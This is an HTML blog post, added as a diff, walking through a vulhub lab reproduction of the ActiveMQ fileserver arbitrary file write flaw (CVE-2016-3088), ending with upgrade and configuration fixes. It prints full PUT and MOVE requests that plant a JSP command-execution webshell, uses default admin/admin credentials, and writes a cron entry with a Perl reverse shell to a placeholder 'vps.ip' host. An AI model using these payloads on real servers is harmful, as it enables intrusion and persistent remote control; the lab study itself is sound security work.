@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>vulhub复现-activemq2 | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="ActiveMQ任意文件写入漏洞（CVE-2016-3088）介绍简介​        ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。 ​        fileserver是一个RESTful API接口，我们">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulhub复现-activemq2">
+<meta property="og:url" content="http://example.com/2023/10/30/vulhub%E5%A4%8D%E7%8E%B0-activemq2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="ActiveMQ任意文件写入漏洞（CVE-2016-3088）介绍简介​        ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。 ​        fileserver是一个RESTful API接口，我们">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/10/30/vulhub%E5%A4%8D%E7%8E%B0-activemq2/image-20231030211024408.png">
+<meta property="og:image" content="http://example.com/2023/10/30/vulhub%E5%A4%8D%E7%8E%B0-activemq2/image-20231030211104646.png">
+<meta property="og:image" content="http://example.com/2023/10/30/vulhub%E5%A4%8D%E7%8E%B0-activemq2/image-20231030211145473.png">
+<meta property="og:image" content="http://example.com/2023/10/30/vulhub%E5%A4%8D%E7%8E%B0-activemq2/image-20231030211510359.png">
+<meta property="og:image" content="http://example.com/2023/10/30/vulhub%E5%A4%8D%E7%8E%B0-activemq2/image-20231030212550615.png">
+<meta property="og:image" content="http://example.com/2023/10/30/vulhub%E5%A4%8D%E7%8E%B0-activemq2/image-20231030213020421.png">
+<meta property="og:image" content="http://example.com/2023/10/30/vulhub%E5%A4%8D%E7%8E%B0-activemq2/image-20231030213200734.png">
+<meta property="og:image" content="http://example.com/2023/10/30/vulhub%E5%A4%8D%E7%8E%B0-activemq2/image-20231030222159611.png">
+<meta property="og:image" content="http://example.com/2023/10/30/vulhub%E5%A4%8D%E7%8E%B0-activemq2/image-20231030222248914.png">
+<meta property="og:image" content="http://example.com/2023/10/30/vulhub%E5%A4%8D%E7%8E%B0-activemq2/image-20231030222116844.png">
+<meta property="article:published_time" content="2023-10-30T12:55:37.000Z">
+<meta property="article:modified_time" content="2023-10-30T14:35:34.824Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="ActiveMQ">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/10/30/vulhub%E5%A4%8D%E7%8E%B0-activemq2/image-20231030211024408.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">John Doe</a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/ActiveMQ/" style="font-size: 10px;">ActiveMQ</a> <a href="/tags/ActiveMQ-CVE-2015-5254/" style="font-size: 10px;">ActiveMQ CVE-2015-5254</a> <a href="/tags/CVE-2021-21311-CVE-2021-43008/" style="font-size: 10px;">CVE-2021-21311 CVE-2021-43008</a> <a href="/tags/CVE-2021-25646/" style="font-size: 10px;">CVE-2021-25646</a> <a href="/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/tags/airflow/" style="font-size: 10px;">airflow</a> <a href="/tags/apisix/" style="font-size: 10px;">apisix</a> <a href="/tags/appweb-aria2/" style="font-size: 10px;">appweb aria2</a> <a href="/tags/couchdb/" style="font-size: 10px;">couchdb</a> <a href="/tags/csrf-ssrf/" style="font-size: 10px;">csrf ssrf</a> <a href="/tags/dns-dubbo/" style="font-size: 10px;">dns dubbo</a> <a href="/tags/php/" style="font-size: 20px;">php</a> <a href="/tags/php-mysql/" style="font-size: 15px;">php;mysql</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82-POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6-WAF-SQLMAP/" style="font-size: 10px;">堆叠注入,宽字节,POST注入,HTTP头注入,二次注入,写入文件,WAF,SQLMAP</a> <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" style="font-size: 20px;">春秋云镜</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-vulhub复现-activemq2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/10/30/vulhub%E5%A4%8D%E7%8E%B0-activemq2/" class="article-date">
+  	<time datetime="2023-10-30T12:55:37.000Z" itemprop="datePublished">2023-10-30</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      vulhub复现-activemq2
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ActiveMQ/" rel="tag">ActiveMQ</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><a href="#ActiveMQ任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"></a>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​        ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p>
+<p>​        fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：</p>
+<ol>
+<li>其使用率并不高</li>
+<li>文件操作容易出现漏洞</li>
+</ol>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>​        5.0.0~5.13.x</p>
+<p>​        但ActiveMQ在 5.12.x~5.13.x 版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启）；在5.14.0版本以后，彻底删除了fileserver应用。</p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>​        本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p>
+<p>文件写入有几种利用方法：</p>
+<ol>
+<li>写入webshell</li>
+<li>写入cron或ssh key等文件</li>
+<li>写入jar或jetty.xml等库和配置文件</li>
+</ol>
+<p>​     写入webshell的好处是，门槛低更方便，但前面也说了fileserver不解析jsp，admin和api两个应用都需要登录才能访问，所以有点鸡肋；写入cron或ssh key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限；写入jar，稍微麻烦点（需要jar的后门），写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我们需要知道activemq的绝对路径。</p>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231030211024408.png" alt="image-20231030211024408"></p>
+<p><img src="image-20231030211104646.png" alt="image-20231030211104646"></p>
+<p>环境监听61616端口和8161端口，其中8161为web控制台端口，本漏洞就出现在web控制台中。</p>
+<p>访问<code>http://your-ip:8161/</code>看到web页面，说明环境已成功运行。</p>
+<p><img src="image-20231030211145473.png" alt="image-20231030211145473"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>​    写入webshell，需要写在admin或api应用中，而这俩应用都需要登录才能访问</p>
+<pre><code> 可以尝试使用默认的ActiveMQ账号密码进行登录，账号密码均为admin</code></pre>
+<p>1.查看绝对路径</p>
+<p>1）访问相应网页</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;your-ip:8161&#x2F;admin&#x2F;test&#x2F;systemProperties.jsp</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231030211510359.png" alt="image-20231030211510359"></p>
+<p>2）有的版本有绝对路径泄露漏洞，构造不存在的地址</p>
+<p>2.上传webshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;fuck.txt HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8161</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko&#x2F;20100101 Firefox&#x2F;70.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMT</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 327</span><br><span class="line"></span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"> out.print(&quot;Hello&lt;&#x2F;br&gt;&quot;);</span><br><span class="line"> String strcmd&#x3D;request.getParameter(&quot;cmd&quot;);</span><br><span class="line"> String line&#x3D;null;</span><br><span class="line"> Process p&#x3D;Runtime.getRuntime().exec(strcmd);</span><br><span class="line"> BufferedReader br&#x3D;new BufferedReader(new InputStreamReader(p.getInputStream()));</span><br><span class="line"> while((line&#x3D;br.readLine())!&#x3D;null)&#123;</span><br><span class="line"> out.print(line+&quot;&lt;&#x2F;br&gt;&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231030212550615.png" alt="image-20231030212550615"></p>
+<p>3.移动到web目录下的api文件夹（/opt/activemq/webapps/api/shell.jsp）中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;fuck.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;shell.jsp</span><br><span class="line">Host: your-ip:8161</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko&#x2F;20100101 Firefox&#x2F;70.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMT</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231030213020421.png" alt="image-20231030213020421"></p>
+<p>4.访问webshell <code>http://your-ip:8161/api/shell.jsp?cmd=id</code>（需要登录admin/admin）</p>
+<p><img src="image-20231030213200734.png" alt="image-20231030213200734"></p>
+<p>成功上传文件</p>
+<h3 id="写入crontab，自动化弹shell"><a href="#写入crontab，自动化弹shell" class="headerlink" title="写入crontab，自动化弹shell"></a>写入crontab，自动化弹shell</h3><p>利用条件：ActiveMQ是root运行。因为cron服务是默认启动的，所以这是一个最稳的方法。</p>
+<p>Alpine 系统：写入 <code>/etc/cron.d/root</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*&#x2F;1 * * * * root &#x2F;usr&#x2F;bin&#x2F;perl -e &#39;use Socket;$i&#x3D;&quot;vps.ip&quot;;$p&#x3D;vps.port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br><span class="line">##</span><br></pre></td></tr></table></figure>
+
+<p>ubuntu 系统：写入 <code>/var/spool/cron/crontabs/root</code></p>
+<p>需要注意的是，ubuntu 不需要在<code>*</code>后面加 root</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#x2F;1 * * * * perl -e &#39;use Socket;$i&#x3D;&quot;vps.ip&quot;;$p&#x3D;vps.port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>1.上传cron配置文件（注意，换行一定要<code>\n</code>，不能是<code>\r\n</code>，否则crontab执行会失败）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;cron.txt HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8161</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko&#x2F;20100101 Firefox&#x2F;70.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMT</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 254</span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * root &#x2F;usr&#x2F;bin&#x2F;perl -e &#39;use Socket;$i&#x3D;&quot;vps.ip&quot;;$p&#x3D;vps.port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br><span class="line">##</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231030222159611.png" alt="image-20231030222159611"></p>
+<p>2.将其移动到<code>/etc/cron.d/root</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;cron.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;etc&#x2F;cron.d&#x2F;root</span><br><span class="line">Host: your-ip:8161</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko&#x2F;20100101 Firefox&#x2F;70.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMT</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231030222248914.png" alt="image-20231030222248914"></p>
+<p>上述两个请求都返回204了，说明写入成功。等待反弹shell:</p>
+<p><img src="image-20231030222116844.png" alt="image-20231030222116844"></p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ol>
+<li>ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。</li>
+<li>通过移除 <code>conf/jetty.xml</code> 的以下配置来禁用 ActiveMQ Fileserver 功能。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean class&#x3D;&quot;org.eclipse.jetty.webapp.WebAppContext&quot;&gt;</span><br><span class="line">	&lt;property name&#x3D;&quot;contextPath&quot; value&#x3D;&quot;&#x2F;fileserver&quot; &#x2F;&gt;</span><br><span class="line">	&lt;property name&#x3D;&quot;resourceBase&quot; value&#x3D;&quot;$&#123;activemq.home&#125;&#x2F;webapps&#x2F;fileserver&quot; &#x2F;&gt;</span><br><span class="line">	&lt;property name&#x3D;&quot;logUrlOnStart&quot; value&#x3D;&quot;true&quot; &#x2F;&gt;</span><br><span class="line">	&lt;property name&#x3D;&quot;parentLoaderPriority&quot; value&#x3D;&quot;true&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;bean&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/10/31/adminer/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          adminer
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/10/29/vulhub%E5%A4%8D%E7%8E%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">vulhub复现</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2023 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
